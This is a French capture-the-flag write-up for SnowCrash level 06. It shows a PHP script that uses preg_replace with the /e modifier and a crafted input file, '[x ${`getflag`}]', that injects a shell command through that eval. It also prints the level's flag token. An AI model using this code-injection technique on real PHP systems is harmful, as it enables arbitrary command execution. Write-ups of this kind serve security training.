# Level 06

## Étapes pour résoudre le challenge

1. **Fichiers initiaux :**

   En arrivant sur le niveau 06, nous trouvons deux fichiers : un exécutable `level06` et un fichier source non compilé `level06.php`.

2. **Examen du contenu de `level06.php` :**

   Nous commençons par examiner le contenu du fichier `level06.php` :

   ```bash
   cat level06.php
   ```

   **Sortie :**
   ```php
   #!/usr/bin/php
   <?php
   function y($m) { 
       $m = preg_replace("/\./", " x ", $m); 
       $m = preg_replace("/@/", " y", $m); 
       return $m; 
   }
   
   function x($y, $z) { 
       $a = file_get_contents($y); 
       $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
       $a = preg_replace("/\[/", "(", $a); 
       $a = preg_replace("/\]/", ")", $a); 
       return $a; 
   }
   
   $r = x($argv[1], $argv[2]); 
   print $r;
   ?>
   ```

3. **Analyse du script :**

   Le script `level06.php` fait les opérations suivantes :
   - Il prend deux arguments en ligne de commande (`$argv[1]` et `$argv[2]`).
   - Il lit le contenu du fichier spécifié par le premier argument (`$argv[1]`).
   - Il remplace les occurrences de `[x ...]` par `y("...")` en utilisant une expression régulière.
   - Il remplace les crochets `[` et `]` par des parenthèses `(` et `)`.
   - Enfin, il affiche le résultat.

4. **Préparation de l'exploitation :**

   Nous allons créer un fichier temporaire dans `/tmp/` avec le contenu suivant pour exploiter la fonction `y` qui est appelée par la fonction `x` :

   ```bash
   echo '[x ${`getflag`}]' > /tmp/flag06
   ```

5. **Exécution du script :**

   Nous exécutons ensuite le script `level06.php` avec le fichier temporaire comme argument :

   ```bash
   ./level06 /tmp/flag06
   ```

   **Sortie :**
   ```bash
   level06@SnowCrash:~$ ./level06 /tmp/flag06
   PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
   in /home/user/level06/level06.php(4) : regexp code on line 1
   ```

   Nous obtenons notre flag : `wiok45aaoguiboiki2tuin6ub`.

6. **Connexion avec le flag :**

   Nous utilisons le flag pour nous connecter au niveau suivant :

   ```bash
   su flag07
   ```

## Résumé

Pour résoudre ce challenge, nous avons exploité une vulnérabilité dans le script PHP en utilisant des expressions régulières pour exécuter une commande arbitraire. En insérant une commande `getflag` dans le fichier d'entrée, nous avons pu obtenir le flag.

Le flag pour `level06` est : `wiok45aaoguiboiki2tuin6ub`.
